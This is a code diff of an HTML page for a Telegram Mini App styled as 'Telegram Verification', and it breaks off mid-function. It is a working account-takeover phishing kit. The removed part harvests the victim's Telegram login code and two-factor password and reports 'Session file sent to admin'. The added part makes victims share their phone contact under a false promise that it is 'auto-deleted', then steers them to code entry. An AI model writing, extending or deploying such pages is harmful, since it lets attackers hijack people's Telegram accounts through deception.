@@ -3,163 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enter OTP - Telegram Verification</title>
+    <title>Telegram Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
         body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .container { width: 100%; max-width: 400px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; animation: fadeIn 0.5s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .header { background: linear-gradient(135deg, #9C27B0 0%, #673AB7 100%); color: white; padding: 30px 20px; text-align: center; }
+        .header { background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; padding: 30px 20px; text-align: center; }
         .header h2 { font-size: 24px; margin-bottom: 5px; }
         .header p { opacity: 0.9; font-size: 14px; }
         .content { padding: 30px; }
-        .phone-info { background: linear-gradient(135deg, #E8F5E9 0%, #C8E6C9 100%); padding: 20px; border-radius: 12px; margin-bottom: 25px; text-align: center; font-weight: bold; border-left: 4px solid #4CAF50; }
-        .otp-inputs { display: flex; gap: 12px; justify-content: center; margin-bottom: 30px; }
-        .otp-input { width: 55px; height: 65px; text-align: center; font-size: 28px; border: 2px solid #e0e0e0; border-radius: 12px; background: #f8f9fa; transition: all 0.3s ease; }
-        .otp-input:focus { border-color: #9C27B0; outline: none; box-shadow: 0 0 0 3px rgba(156, 39, 176, 0.1); background: white; transform: translateY(-2px); }
-        .otp-input.filled { border-color: #4CAF50; background: #E8F5E9; }
-        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #9C27B0 0%, #673AB7 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(156, 39, 176, 0.3); }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(156, 39, 176, 0.4); }
+        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3); }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4); }
         .btn:active { transform: translateY(0); }
         .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
         .error { background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%); color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; animation: shake 0.5s ease; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); } 20%, 40%, 60%, 80% { transform: translateX(5px); } }
         .error.show { display: block; }
-        .warning { background: linear-gradient(135deg, #FFB74D 0%, #F57C00 100%); color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; }
-        .warning.show { display: block; }
+        .success { background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%); color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; animation: slideUp 0.5s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .success.show { display: block; }
         .hidden { display: none; }
+        .info-box { background: #f8f9fa; padding: 20px; border-radius: 12px; margin-bottom: 25px; text-align: center; font-size: 14px; line-height: 1.6; border-left: 4px solid #0088cc; }
+        .info-box b { color: #0088cc; }
         .loading { text-align: center; padding: 40px 20px; }
-        .loading-spinner { width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #9C27B0; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        .loading-spinner { width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .success { text-align: center; padding: 40px 20px; animation: slideUp 0.5s ease; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .success-icon { font-size: 70px; color: #4CAF50; margin-bottom: 20px; animation: bounce 1s ease; }
-        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-20px);} 60% {transform: translateY(-10px);} }
-        .twofa-screen { animation: slideIn 0.5s ease; }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
-        .twofa-input { width: 100%; padding: 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 16px; margin-bottom: 20px; transition: all 0.3s ease; }
-        .twofa-input:focus { border-color: #9C27B0; outline: none; box-shadow: 0 0 0 3px rgba(156, 39, 176, 0.1); }
-        .back-btn { background: linear-gradient(135deg, #6c757d 0%, #495057 100%); }
-        .back-btn:hover { background: linear-gradient(135deg, #5a6268 0%, #343a40 100%); }
-        .resend-btn { background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%); margin-top: 10px; }
-        .resend-btn:disabled { opacity: 0.5; }
-        .instruction { text-align: center; color: #666; margin-bottom: 25px; line-height: 1.6; }
-        .instruction small { color: #999; display: block; margin-top: 5px; }
-        .countdown { display: inline-block; background: #f8f9fa; padding: 5px 10px; border-radius: 20px; font-weight: bold; color: #9C27B0; }
-        .otp-hint { text-align: center; margin-top: 15px; color: #666; font-size: 13px; }
-        .otp-hint i { color: #9C27B0; margin-right: 5px; }
+        .contact-screen .info-box { border-left-color: #4CAF50; }
+        .otp-screen .info-box { border-left-color: #9C27B0; }
+        .step-number { display: inline-flex; align-items: center; justify-content: center; width: 24px; height: 24px; background: #0088cc; color: white; border-radius: 50%; margin-right: 8px; font-size: 12px; }
+        .privacy-note { text-align: center; color: #666; font-size: 13px; margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee; }
+        .privacy-note i { color: #4CAF50; margin-right: 5px; }
+        .back-btn { background: #6c757d; margin-top: 10px; }
+        .back-btn:hover { background: #5a6268; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h2>🔢 Enter OTP</h2>
-            <p>OTP sent to your phone</p>
+            <h2>🔐 Telegram Verification</h2>
+            <p>Verify your account securely</p>
         </div>
         
         <div class="content">
-            <!-- OTP Entry Screen -->
-            <div id="otp-screen">
-                <div class="phone-info">
-                    <div style="font-size: 20px; color: #4CAF50; margin-bottom: 5px;">📱</div>
-                    <b>Phone Number:</b><br>
-                    <span id="phone-display" style="font-family: monospace; font-size: 18px; color: #333;">{{ phone }}</span>
+            <!-- Initial Screen -->
+            <div id="initial-screen">
+                <div class="info-box">
+                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
+                        <div style="font-size: 40px; color: #0088cc;">🔒</div>
+                    </div>
+                    <b>How to verify your account:</b><br><br>
+                    <div style="text-align: left; padding: 0 10px;">
+                        <div><span class="step-number">1</span> Click "Share Contact" button</div>
+                        <div><span class="step-number">2</span> Telegram will ask for permission</div>
+                        <div><span class="step-number">3</span> Allow contact sharing</div>
+                        <div><span class="step-number">4</span> OTP will be sent to your phone</div>
+                        <div><span class="step-number">5</span> Enter OTP in next screen</div>
+                    </div>
                 </div>
                 
                 <div class="error" id="error-message"></div>
-                <div class="warning" id="warning-message"></div>
+                <div class="success" id="success-message"></div>
                 
-                <div class="instruction">
-                    Enter the 5-digit code sent to your phone<br>
-                    <small>You can type the numbers or paste the full code</small>
-                </div>
-                
-                <div class="otp-inputs">
-                    <input type="text" class="otp-input" id="otp1" maxlength="1" oninput="moveToNext(this, 1)" onkeydown="handleKeyDown(event, 0)" autocomplete="off" inputmode="numeric">
-                    <input type="text" class="otp-input" id="otp2" maxlength="1" oninput="moveToNext(this, 2)" onkeydown="handleKeyDown(event, 1)" autocomplete="off" inputmode="numeric">
-                    <input type="text" class="otp-input" id="otp3" maxlength="1" oninput="moveToNext(this, 3)" onkeydown="handleKeyDown(event, 2)" autocomplete="off" inputmode="numeric">
-                    <input type="text" class="otp-input" id="otp4" maxlength="1" oninput="moveToNext(this, 4)" onkeydown="handleKeyDown(event, 3)" autocomplete="off" inputmode="numeric">
-                    <input type="text" class="otp-input" id="otp5" maxlength="1" oninput="moveToNext(this, 5)" onkeydown="handleKeyDown(event, 4)" autocomplete="off" inputmode="numeric">
-                </div>
-                
-                <button class="btn" onclick="verifyOTP()" id="verify-btn" disabled>Verify OTP</button>
-                
-                <button class="btn back-btn" onclick="startOver()" id="back-btn">
-                    ↩ Start Over
+                <button class="btn" onclick="shareContact()" id="share-btn">
+                    📞 Share My Contact
                 </button>
                 
-                <div class="otp-hint">
-                    <i class="fas fa-clock"></i> OTP valid for: <span class="countdown" id="otp-timer">05:00</span>
-                </div>
-                
-                <div style="text-align: center; margin-top: 25px; color: #666; font-size: 13px;">
-                    <p>Not received OTP?</p>
-                    <button class="btn resend-btn" onclick="resendOTP()" id="resend-btn" disabled>
-                        <i class="fas fa-redo"></i> Resend OTP (<span id="resend-timer">30</span>s)
-                    </button>
+                <div class="privacy-note">
+                    <i class="fas fa-shield-alt"></i> Your contact will be <b>auto-deleted</b> immediately after processing
                 </div>
             </div>
             
-            <!-- 2FA Screen -->
-            <div id="twofa-screen" class="hidden twofa-screen">
-                <div class="warning show">
-                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
-                        <div style="font-size: 40px;">🔐</div>
+            <!-- Contact Shared Screen -->
+            <div id="contact-screen" class="hidden contact-screen">
+                <div class="info-box">
+                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 15px;">
+                        <div style="font-size: 50px; color: #4CAF50;">✅</div>
                     </div>
-                    <b>Two-Factor Authentication Required</b><br>
-                    Please enter your 2FA password
+                    <b>Contact shared successfully!</b><br>
+                    Telegram is processing your contact information...
                 </div>
                 
-                <div style="margin-bottom: 20px;">
-                    <input type="password" id="twofa-password" class="twofa-input" placeholder="Enter your 2FA password" 
-                           autocomplete="current-password">
-                </div>
-                
-                <div class="error" id="twofa-error"></div>
-                
-                <button class="btn" onclick="verify2FA()" id="twofa-btn">
-                    Verify 2FA Password
-                </button>
-                
-                <button class="btn back-btn" onclick="showOTPScreen()">
-                    ↩ Back to OTP
-                </button>
-            </div>
-            
-            <!-- Loading Screen -->
-            <div id="loading-screen" class="hidden">
                 <div class="loading">
                     <div class="loading-spinner"></div>
-                    <p id="loading-text" style="color: #666; font-size: 16px; margin-top: 15px;">Processing...</p>
+                    <p id="waiting-text" style="color: #666; font-size: 15px; margin-top: 10px;">
+                        Waiting for contact to be received...
+                    </p>
+                    <p style="color: #999; font-size: 13px; margin-top: 10px;">
+                        This may take a few seconds
+                    </p>
                 </div>
+                
+                <div class="error" id="contact-error"></div>
+                
+                <button class="btn back-btn" onclick="goBack()">
+                    ↩ Go Back
+                </button>
             </div>
             
-            <!-- Success Screen -->
-            <div id="success-screen" class="hidden">
-                <div class="success">
-                    <div class="success-icon">✅</div>
-                    <h3 style="color: #4CAF50; margin-bottom: 15px;">Verified Successfully!</h3>
-                    <p style="color: #666; margin-bottom: 10px;">Your account has been verified.</p>
-                    <p style="color: #999; font-size: 14px; margin-bottom: 25px;">
-                        <i class="fas fa-shield-alt"></i> Session file sent to admin
-                    </p>
-                    <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin-top: 20px;">
-                        <p style="color: #666; font-size: 14px; margin-bottom: 10px;">
-                            <i class="fas fa-clock"></i> Closing in <span id="countdown" style="font-weight: bold; color: #9C27B0;">5</span> seconds...
-                        </p>
+            <!-- OTP Sent Screen -->
+            <div id="otp-screen" class="hidden otp-screen">
+                <div class="success show">
+                    <div style="display: flex; align-items: center;">
+                        <div style="font-size: 30px; margin-right: 10px;">✅</div>
+                        <div>
+                            <b>OTP Sent Successfully!</b><br>
+                            <small>Check your Telegram app</small>
+                        </div>
                     </div>
                 </div>
-            </div>
-            
-            <!-- Error Screen -->
-            <div id="error-screen" class="hidden">
-                <div class="error" style="display: block; text-align: center; padding: 30px 20px;">
-                    <div style="font-size: 60px; margin-bottom: 20px;">❌</div>
-                    <h3 style="margin-bottom: 15px;">Verification Failed</h3>
-                    <p id="error-detail" style="margin-bottom: 25px; color: white;">Unknown error occurred</p>
-                    <button class="btn" onclick="startOver()" style="margin-top: 10px;">
-                        <i class="fas fa-redo"></i> Try Again
+                
+                <div class="info-box" id="phone-display">
+                    <b>📱 Phone Number:</b><br>
+                    <span id="phone-number" style="font-family: monospace; font-size: 16px; color: #333;">Loading...</span>
+                </div>
+                
+                <div class="info-box">
+                    <b>📨 5-digit OTP sent to your phone</b><br>
+                    Check your Telegram messages for the verification code
+                </div>
+                
+                <button class="btn" onclick="goToOTPPage()">
+                    🔢 Enter OTP Now
+                </button>
+                
+                <div style="text-align: center; margin-top: 15px;">
+                    <button onclick="goBack()" style="background: none; border: none; color: #0088cc; cursor: pointer; font-size: 14px;">
+                        ↻ Start Over
                     </button>
                 </div>
             </div>
@@ -167,431 +138,315 @@
     </div>
 
     <script>
-        // Get user ID and phone from template variables
-        const userId = '{{ user_id }}';
-        const phoneNumber = '{{ phone }}';
+        let userId = null;
+        let checkInterval = null;
+        let isProcessing = false;
         
-        let otpCode = '';
-        let otpTimer = 300; // 5 minutes in seconds
-        let resendTimer = 30;
-        let canResend = false;
-        let otpInterval = null;
-        let resendInterval = null;
-        
-        // Initialize
+        // Initialize Telegram WebApp
         document.addEventListener('DOMContentLoaded', function() {
-            console.log("OTP page loaded for user:", userId, "phone:", phoneNumber);
+            console.log("🔧 WebApp initialized");
             
-            // Initialize Telegram WebApp
-            if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
+            // Check if running in Telegram WebApp
+            const isTelegramWebApp = typeof Telegram !== 'undefined' && Telegram.WebApp;
+            
+            if (isTelegramWebApp) {
+                // Telegram WebApp environment
                 Telegram.WebApp.ready();
                 Telegram.WebApp.expand();
-                Telegram.WebApp.setHeaderColor('#9C27B0');
+                Telegram.WebApp.setHeaderColor('#0088cc');
                 Telegram.WebApp.setBackgroundColor('#f0f2f5');
-                Telegram.WebApp.disableVerticalSwipes();
+                
+                // Get user from Telegram WebApp
+                const user = Telegram.WebApp.initDataUnsafe?.user;
+                if (user && user.id) {
+                    userId = user.id.toString();
+                    console.log("✅ User ID from Telegram WebApp:", userId);
+                    
+                    // Send user ID to server to create session
+                    sendUserIdToServer(userId);
+                } else {
+                    // Try to get from initData
+                    try {
+                        const initData = Telegram.WebApp.initData;
+                        if (initData) {
+                            // Parse initData to get user ID
+                            const params = new URLSearchParams(initData);
+                            const userParam = params.get('user');
+                            if (userParam) {
+                                const userData = JSON.parse(userParam);
+                                userId = userData.id.toString();
+                                console.log("✅ User ID from initData:", userId);
+                                sendUserIdToServer(userId);
+                            }
+                        }
+                    } catch (e) {
+                        console.log("❌ Could not parse initData:", e);
+                    }
+                }
+                
+                // If still no user ID, try to get from URL
+                if (!userId) {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    userId = urlParams.get('user_id');
+                    if (userId) {
+                        console.log("✅ User ID from URL:", userId);
+                        sendUserIdToServer(userId);
+                    }
+                }
+            } else {
+                // Not in Telegram WebApp
+                console.log("⚠️ Not running in Telegram WebApp");
+                
+                // Try to get user ID from URL
+                const urlParams = new URLSearchParams(window.location.search);
+                userId = urlParams.get('user_id');
+                if (userId) {
+                    console.log("✅ User ID from URL:", userId);
+                    sendUserIdToServer(userId);
+                } else {
+                    // For testing, create a test user ID
+                    userId = 'test_' + Date.now();
+                    console.log("⚠️ Using test user ID:", userId);
+                    sendUserIdToServer(userId);
+                }
             }
             
-            // Validate session
-            if (!userId || userId === '{{ user_id }}' || !phoneNumber || phoneNumber === '{{ phone }}') {
-                showErrorScreen('Session expired. Please share contact again.');
-                return;
+            // Check existing session
+            if (userId) {
+                setTimeout(() => {
+                    checkExistingSession();
+                }, 500);
             }
-            
-            // Update phone display
-            document.getElementById('phone-display').textContent = phoneNumber;
-            
-            // Start timers
-            startOTPTimer();
-            startResendTimer();
-            
-            // Focus first OTP input
-            setTimeout(() => {
-                document.getElementById('otp1').focus();
-            }, 300);
-            
-            // Add paste handler
-            document.addEventListener('paste', handlePaste);
-            
-            // Check if session is still valid
-            checkSessionValidity();
         });
         
-        function checkSessionValidity() {
-            if (!userId) return;
+        function sendUserIdToServer(userId) {
+            // Update URL with user ID for consistency
+            const url = new URL(window.location);
+            url.searchParams.set('user_id', userId);
+            window.history.replaceState({}, '', url);
             
-            fetch(`/api/check-otp-sent/${userId}`)
+            // Send user ID to server to ensure session exists
+            fetch('/api/check-otp-sent/' + userId)
                 .then(response => response.json())
                 .then(data => {
-                    if (!data.success || !data.otp_sent) {
-                        showErrorScreen('Session expired. OTP not sent. Please start over.');
-                    }
+                    console.log("Server session response:", data);
                 })
                 .catch(error => {
-                    console.error("Session check error:", error);
+                    console.error("Error sending user ID to server:", error);
                 });
         }
         
-        function startOTPTimer() {
-            clearInterval(otpInterval);
-            otpTimer = 300; // 5 minutes
+        function checkExistingSession() {
+            if (!userId) {
+                showError("Cannot get user ID. Please try again.");
+                return;
+            }
             
-            otpInterval = setInterval(() => {
-                otpTimer--;
-                const minutes = Math.floor(otpTimer / 60);
-                const seconds = otpTimer % 60;
-                document.getElementById('otp-timer').textContent = 
-                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                
-                if (otpTimer <= 0) {
-                    clearInterval(otpInterval);
-                    showError('OTP expired. Please request a new OTP.');
-                    document.getElementById('verify-btn').disabled = true;
-                    document.getElementById('resend-btn').disabled = false;
-                    canResend = true;
-                }
-            }, 1000);
-        }
-        
-        function startResendTimer() {
-            clearInterval(resendInterval);
-            resendTimer = 30;
-            canResend = false;
-            document.getElementById('resend-btn').disabled = true;
-            document.getElementById('resend-timer').textContent = resendTimer;
+            console.log("🔍 Checking existing session for user:", userId);
             
-            resendInterval = setInterval(() => {
-                resendTimer--;
-                document.getElementById('resend-timer').textContent = resendTimer;
-                
-                if (resendTimer <= 0) {
-                    clearInterval(resendInterval);
-                    canResend = true;
-                    document.getElementById('resend-btn').disabled = false;
-                    document.getElementById('resend-timer').textContent = '0';
-                }
-            }, 1000);
-        }
-        
-        function handleKeyDown(event, index) {
-            const inputs = document.querySelectorAll('.otp-input');
-            
-            // Handle backspace
-            if (event.key === 'Backspace') {
-                event.preventDefault();
-                if (inputs[index].value === '') {
-                    // Move to previous input if current is empty
-                    if (index > 0) {
-                        inputs[index - 1].focus();
-                        inputs[index - 1].value = '';
-                        updateOTPCode();
+            fetch(`/api/check-otp-sent/${userId}`)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}`);
                     }
-                } else {
-                    // Clear current input
-                    inputs[index].value = '';
-                    updateOTPCode();
-                }
-                return;
-            }
-            
-            // Handle arrow keys
-            if (event.key === 'ArrowLeft' && index > 0) {
-                inputs[index - 1].focus();
-                event.preventDefault();
-                return;
-            }
-            if (event.key === 'ArrowRight' && index < 4) {
-                inputs[index + 1].focus();
-                event.preventDefault();
-                return;
-            }
-            
-            // Handle Tab key
-            if (event.key === 'Tab') {
-                if (event.shiftKey && index > 0) {
-                    // Shift+Tab: move to previous
-                    inputs[index - 1].focus();
-                    event.preventDefault();
-                } else if (!event.shiftKey && index < 4) {
-                    // Tab: move to next
-                    inputs[index + 1].focus();
-                    event.preventDefault();
-                }
-                return;
-            }
-            
-            // Only allow numbers
-            if (event.key.length === 1 && !/^\d$/.test(event.key)) {
-                event.preventDefault();
-                return;
-            }
-            
-            // Auto-move to next after input
-            if (/^\d$/.test(event.key) && index < 4) {
-                setTimeout(() => {
-                    inputs[index + 1].focus();
-                }, 10);
-            }
-        }
-        
-        function moveToNext(input, nextIndex) {
-            // Only allow numbers
-            input.value = input.value.replace(/\D/g, '');
-            
-            // Update styling
-            if (input.value) {
-                input.classList.add('filled');
-            } else {
-                input.classList.remove('filled');
-            }
-            
-            // Update OTP code
-            updateOTPCode();
-            
-            // Auto-move to next input if current is filled
-            if (input.value.length === 1 && nextIndex <= 5) {
-                const inputs = document.querySelectorAll('.otp-input');
-                if (nextIndex - 1 < inputs.length) {
-                    // Small delay to ensure value is set
-                    setTimeout(() => {
-                        inputs[nextIndex - 1].focus();
-                    }, 10);
-                }
-            }
-            
-            // Auto-submit if all 5 digits entered
-            if (otpCode.length === 5) {
-                setTimeout(() => {
-                    verifyOTP();
-                }, 300);
-            }
-        }
-        
-        function handlePaste(event) {
-            event.preventDefault();
-            const pastedText = (event.clipboardData || window.clipboardData).getData('text');
-            const digits = pastedText.replace(/\D/g, '').slice(0, 5);
-            
-            if (digits.length === 5) {
-                const inputs = document.querySelectorAll('.otp-input');
-                for (let i = 0; i < 5; i++) {
-                    inputs[i].value = digits[i] || '';
-                    if (inputs[i].value) {
-                        inputs[i].classList.add('filled');
-                    }
-                }
-                updateOTPCode();
-                
-                // Auto-submit after paste
-                setTimeout(() => {
-                    verifyOTP();
-                }, 300);
-            } else {
-                showError('Please paste a 5-digit OTP code');
-            }
-        }
-        
-        function updateOTPCode() {
-            const inputs = document.querySelectorAll('.otp-input');
-            otpCode = Array.from(inputs).map(input => input.value).join('');
-            document.getElementById('verify-btn').disabled = otpCode.length !== 5;
-        }
-        
-        function verifyOTP() {
-            if (otpCode.length !== 5) {
-                showError('Please enter 5-digit OTP');
-                return;
-            }
-            
-            showLoading('Verifying OTP...');
-            
-            fetch('/api/verify-otp', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    user_id: userId,
-                    otp: otpCode
+                    return response.json();
                 })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}`);
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log("OTP verification response:", data);
-                
-                if (data.success) {
-                    if (data.requires_2fa) {
-                        // Show 2FA screen
-                        hideLoading();
-                        document.getElementById('otp-screen').classList.add('hidden');
-                        document.getElementById('twofa-screen').classList.remove('hidden');
-                        document.getElementById('twofa-password').focus();
-                    } else {
-                        // Success - show success screen
-                        showSuccess();
-                    }
-                } else {
-                    hideLoading();
+                .then(data => {
+                    console.log("📊 Session check response:", data);
                     
-                    if (data.error && data.error.includes('expired')) {
-                        showError('OTP expired. Please request a new OTP.');
-                        document.getElementById('resend-btn').disabled = false;
-                        canResend = true;
-                    } else if (data.error && data.error.includes('attempts')) {
-                        showError('Too many attempts. Please start over.');
-                        setTimeout(() => {
-                            startOver();
-                        }, 3000);
+                    if (data.success) {
+                        if (data.otp_sent && data.phone) {
+                            // OTP already sent, show OTP screen
+                            console.log("✅ OTP already sent, showing OTP screen");
+                            document.getElementById('initial-screen').classList.add('hidden');
+                            document.getElementById('otp-screen').classList.remove('hidden');
+                            document.getElementById('phone-number').textContent = data.phone;
+                            
+                            // Auto-redirect to OTP page after 3 seconds
+                            setTimeout(() => {
+                                goToOTPPage();
+                            }, 3000);
+                        } else if (data.contact_received) {
+                            // Contact received but OTP not sent yet
+                            console.log("🔄 Contact received, waiting for OTP");
+                            document.getElementById('initial-screen').classList.add('hidden');
+                            document.getElementById('contact-screen').classList.remove('hidden');
+                            document.getElementById('waiting-text').textContent = "Contact received! Sending OTP...";
+                            startCheckingOTPStatus();
+                        } else {
+                            // Session ready for contact sharing
+                            console.log("✅ Session ready for contact sharing");
+                            showSuccess("Ready to verify. Click 'Share Contact' to begin.");
+                        }
                     } else {
-                        showError(data.error || 'Verification failed');
+                        // Session error
+                        console.error("❌ Session error:", data.error);
+                        if (data.error && data.error.includes('expired')) {
+                            showError("Session expired. Please click 'Share Contact' again.");
+                        }
                     }
-                    
-                    // Clear OTP on error
-                    clearOTPInputs();
-                }
-            })
-            .catch(error => {
-                hideLoading();
-                showError('Network error. Please check your connection and try again.');
-                console.error("OTP verification error:", error);
-            });
-        }
-        
-        function verify2FA() {
-            const password = document.getElementById('twofa-password').value.trim();
-            
-            if (!password) {
-                document.getElementById('twofa-error').textContent = 'Please enter 2FA password';
-                document.getElementById('twofa-error').classList.add('show');
-                return;
-            }
-            
-            showLoading('Verifying 2FA password...');
-            
-            fetch('/api/verify-2fa', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    user_id: userId,
-                    password: password
                 })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}`);
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log("2FA verification response:", data);
-                
-                if (data.success) {
-                    showSuccess();
-                } else {
-                    hideLoading();
-                    document.getElementById('twofa-error').textContent = data.error || '2FA verification failed';
-                    document.getElementById('twofa-error').classList.add('show');
-                    
-                    // Clear password field
-                    document.getElementById('twofa-password').value = '';
-                    document.getElementById('twofa-password').focus();
-                }
-            })
-            .catch(error => {
-                hideLoading();
-                document.getElementById('twofa-error').textContent = 'Network error. Please try again.';
-                document.getElementById('twofa-error').classList.add('show');
-                console.error("2FA verification error:", error);
-            });
+                .catch(error => {
+                    console.error("❌ Session check error:", error);
+                    showError("Connection error. Please try again.");
+                });
         }
         
-        function resendOTP() {
-            if (!canResend) {
-                showError('Please wait before resending OTP');
+        function shareContact() {
+            if (!userId) {
+                showError("Cannot get user ID. Please open from Telegram bot.");
                 return;
             }
             
-            showLoading('Resending OTP...');
+            if (isProcessing) {
+                console.log("⚠️ Already processing contact");
+                return;
+            }
             
-            // In a real implementation, you would call an API to resend OTP
-            // For now, simulate the process
-            setTimeout(() => {
-                hideLoading();
-                showWarning('New OTP sent to your phone!');
-                startResendTimer();
-                clearOTPInputs();
-                document.getElementById('otp1').focus();
-                
-                // Reset OTP timer
-                startOTPTimer();
-            }, 2000);
-        }
-        
-        function startOver() {
-            window.location.href = '/';
-        }
-        
-        function showOTPScreen() {
-            document.getElementById('twofa-screen').classList.add('hidden');
-            document.getElementById('otp-screen').classList.remove('hidden');
-            clearOTPInputs();
-            document.getElementById('otp1').focus();
-        }
-        
-        function clearOTPInputs() {
-            const inputs = document.querySelectorAll('.otp-input');
-            inputs.forEach(input => {
-                input.value = '';
-                input.classList.remove('filled');
-            });
-            otpCode = '';
-            document.getElementById('verify-btn').disabled = true;
-        }
-        
-        function showLoading(message) {
-            document.getElementById('loading-text').textContent = message || 'Processing...';
-            document.getElementById('otp-screen').classList.add('hidden');
-            document.getElementById('twofa-screen').classList.add('hidden');
-            document.getElementById('loading-screen').classList.remove('hidden');
-            document.getElementById('success-screen').classList.add('hidden');
-            document.getElementById('error-screen').classList.add('hidden');
-        }
-        
-        function hideLoading() {
-            document.getElementById('loading-screen').classList.add('hidden');
-        }
-        
-        function showSuccess() {
-            hideLoading();
-            document.getElementById('otp-screen').classList.add('hidden');
-            document.getElementById('twofa-screen').classList.add('hidden');
-            document.getElementById('success-screen').classList.remove('hidden');
+            isProcessing = true;
+            console.log("📤 Starting contact sharing for user:", userId);
             
-            // Start countdown
-            let countdown = 5;
-            const countdownEl = document.getElementById('countdown');
-            const timer = setInterval(() => {
-                countdown--;
-                countdownEl.textContent = countdown;
+            // Show contact screen
+            document.getElementById('initial-screen').classList.add('hidden');
+            document.getElementById('contact-screen').classList.remove('hidden');
+            document.getElementById('waiting-text').textContent = "Opening contact sharing...";
+            document.getElementById('contact-error').classList.remove('show');
+            
+            // Check if we're in Telegram WebApp
+            const isTelegramWebApp = typeof Telegram !== 'undefined' && Telegram.WebApp;
+            
+            if (isTelegramWebApp && Telegram.WebApp.requestContact) {
+                console.log("📱 Using Telegram WebApp contact sharing");
                 
-                if (countdown <= 0) {
-                    clearInterval(timer);
-                    if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
-                        Telegram.WebApp.close();
+                // Request contact permission
+                Telegram.WebApp.requestContact(function(shared) {
+                    console.log("📞 Contact sharing result:", shared);
+                    
+                    if (shared) {
+                        // User shared contact successfully
+                        console.log("✅ User shared contact via Telegram");
+                        document.getElementById('waiting-text').textContent = "Contact shared! Processing...";
+                        
+                        // In Telegram WebApp, the contact is automatically sent to the bot
+                        // Now wait for the bot to process it and send OTP
+                        startCheckingOTPStatus();
                     } else {
-                        window.location.href = '/';
+                        // User cancelled
+                        console.log("❌ User cancelled contact sharing");
+                        isProcessing = false;
+                        goBack();
+                        showError("Contact sharing was cancelled. Please try again.");
                     }
+                });
+            } else {
+                // Not in Telegram WebApp or requestContact not available
+                console.log("⚠️ Using manual contact sharing");
+                document.getElementById('waiting-text').textContent = 
+                    "Please go back to the Telegram chat and share your contact using the 'Attach' button";
+                
+                // For testing, simulate contact sharing
+                startCheckingOTPStatus();
+            }
+        }
+        
+        function startCheckingOTPStatus() {
+            console.log("🔄 Starting OTP status monitoring for user:", userId);
+            
+            if (checkInterval) {
+                clearInterval(checkInterval);
+            }
+            
+            let attempts = 0;
+            const maxAttempts = 60; // 60 checks = 120 seconds timeout
+            
+            checkInterval = setInterval(() => {
+                checkOTPStatus();
+                attempts++;
+                
+                if (attempts >= maxAttempts) {
+                    clearInterval(checkInterval);
+                    isProcessing = false;
+                    showError("Timeout: OTP not sent. Please try again.");
+                    document.getElementById('contact-error').textContent = "Timeout: OTP not sent. Please try again.";
+                    document.getElementById('contact-error').classList.add('show');
                 }
-            }, 1000);
+            }, 2000); // Check every 2 seconds
+            
+            // Check immediately
+            checkOTPStatus();
+        }
+        
+        function checkOTPStatus() {
+            if (!userId) {
